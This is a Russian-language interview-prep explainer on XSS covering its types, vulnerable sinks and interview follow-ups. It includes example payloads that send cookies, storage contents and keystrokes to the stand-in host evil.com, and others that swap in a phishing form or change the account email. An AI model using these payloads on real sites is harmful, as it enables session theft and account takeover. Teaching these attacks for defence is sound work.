# Q020. Что такое межсайтовый скриптинг (XSS)?

> **Источник:** [03. security.md](../03.%20security.md) · **Тема:** Security

---

## Короткий ответ

**XSS (Cross-Site Scripting)** — атака, при которой злоумышленник внедряет вредоносный JavaScript-код в веб-страницу, который выполняется в браузере жертвы в контексте доверенного сайта. Это позволяет атакующему красть куки/токены, выполнять действия от имени пользователя, изменять содержимое страницы или перенаправлять на фишинговые сайты. XSS входит в OWASP Top 10 (A03: Injection).

---

## Развёрнутый ответ

### Типы XSS

#### 1. Reflected XSS (Отражённый)

Вредоносный скрипт передаётся в URL, сервер «отражает» его обратно в HTML-ответе без санитизации.

```
URL: https://search.com/?q=<script>fetch('https://evil.com?c='+document.cookie)</script>

Сервер: <h1>Результаты для: <script>fetch('https://evil.com?c='+document.cookie)</script></h1>
       ↑ Скрипт выполняется в браузере жертвы
```

Вектор атаки: отправить жертве вредоносную ссылку по email/мессенджеру.

```html
<!-- Уязвимый сервер (Node.js/Express без шаблонизатора) -->
app.get('/search', (req, res) => {
  // ❌ Напрямую вставляет query в HTML
  res.send(`<h1>Results for: ${req.query.q}</h1>`);
});
```

#### 2. Stored XSS (Сохранённый / Persistent)

Вредоносный скрипт сохраняется в БД и выполняется при каждом просмотре страницы.

```javascript
// Атакующий отправляет комментарий:
{
  "text": "<script>document.location='https://evil.com?c='+document.cookie</script>"
}

// Сервер сохраняет в БД без санитизации
// При загрузке страницы с комментариями — скрипт выполняется у ВСЕХ посетителей
```

Наиболее опасный тип — атакует всех пользователей, посещающих заражённую страницу.

#### 3. DOM-based XSS

Вредоносный код выполняется через манипуляцию DOM без участия сервера.

```javascript
// Уязвимый клиентский код:
const username = location.hash.slice(1); // #<img src=x onerror=alert(1)>
document.querySelector('#greeting').innerHTML = `Hello, ${username}`; // ❌

// Атака:
// https://myapp.com/#<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```

Источники (sources): `location.hash`, `location.search`, `document.referrer`, `window.name`
Стоки (sinks): `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`

#### 4. Self-XSS

Атакующий убеждает пользователя вставить скрипт в консоль браузера самостоятельно («введите этот код, чтобы получить бесплатную подписку»). Защита: предупреждение в DevTools консоли (Facebook, Google делают это).

### Что может сделать XSS-атакующий

```javascript
// 1. Кража cookies (если не HttpOnly)
document.cookie;
document.location = `https://evil.com/steal?c=${encodeURIComponent(document.cookie)}`;

// 2. Кража localStorage / sessionStorage
const stolen = { ...localStorage, ...sessionStorage };
fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(stolen) });

// 3. Keylogging — перехват ввода
document.addEventListener('keydown', (e) => {
  fetch(`https://evil.com/keys?k=${e.key}`);
});

// 4. Действия от имени пользователя (CSRF через XSS)
fetch('/api/settings/email', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include', // куки отправятся автоматически
  body: JSON.stringify({ email: 'hacker@evil.com' }),
});

// 5. Фишинг — подмена формы входа
document.body.innerHTML = '<form action="https://evil.com/phish">...';

// 6. Webcam/Microphone (если есть разрешения)
navigator.mediaDevices.getUserMedia({ video: true, audio: true });
```

### Уязвимые паттерны

```javascript
// ❌ Все это потенциальные XSS-sink'и:
element.innerHTML = userInput;           // Выполняет HTML и скрипты
element.outerHTML = userInput;
document.write(userInput);
element.insertAdjacentHTML('beforeend', userInput);
new DOMParser().parseFromString(userInput, 'text/html');
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);             // Если строка, не функция
setInterval(userInput, 1000);
location.href = userInput;               // javascript: URI
element.src = userInput;                 // javascript: URI
```

### Пример реального вектора

```javascript
// Поле поиска с автодополнением:
const results = await fetch(`/api/search?q=${searchInput.value}`);
// Сервер возвращает: { suggestions: ["<img src=x onerror=alert(1)>"] }
// Рендеринг: suggestionEl.innerHTML = item; // ❌ → XSS
```

### Важные нюансы

- **XSS и HttpOnly cookies** — HttpOnly защищает куки от кражи, но XSS всё равно опасен: атакующий может делать запросы от имени пользователя (куки отправляются автоматически браузером)
- **CSP — основная защита** — блокирует выполнение инлайн-скриптов и ограничивает источники; подробно: `017-chto-takoe-content-security-policy-csp.md`
- **Мутационный XSS (mXSS)** — браузер «исправляет» HTML при разборе, что может создать валидный вектор атаки из экранированной строки; DOMPurify решает эту проблему
- **Angular/React/Vue** по умолчанию экранируют output — но `dangerouslySetInnerHTML` (React), `[innerHTML]` (Angular) — опасны

---

## На что обратить внимание на собеседовании

### Каверзные follow-up (что спросят дальше)

- **Чем DOM-based XSS отличается от Reflected?** — Reflected обрабатывается сервером; DOM-based — исключительно на клиенте через JS; сервер не видит payload.
- **Защищает ли HttpOnly от XSS?** — Частично: скрипт не прочитает куку, но всё равно может делать запросы с этой кукой (браузер отправляет её автоматически).
- **Как React защищает от XSS?** — JSX автоматически экранирует строки при рендеринге в DOM. Но `dangerouslySetInnerHTML={{ __html: value }}` — убирает эту защиту.
- **Что такое Stored XSS через SVG?** — SVG может содержать `<script>` тег; если пользователи загружают SVG как «изображение», и оно рендерится напрямую — XSS.

### Красные флаги (чего не говорить)

- «Экранирование HTML решает все XSS» — HTML-экранирование работает для HTML-контекста, но не для JS-контекста, CSS, URL-атрибутов — контекст важен.
- «XSS невозможен в SPA» — DOM-based XSS специфичен для SPA.
- «HttpOnly полностью защищает от XSS» — защищает только от кражи кук через JS.

### Связанные темы

- `021-zashchita-ot-xss.md`
- `017-chto-takoe-content-security-policy-csp.md`
- `011-secure-i-httponly-cookies.md`
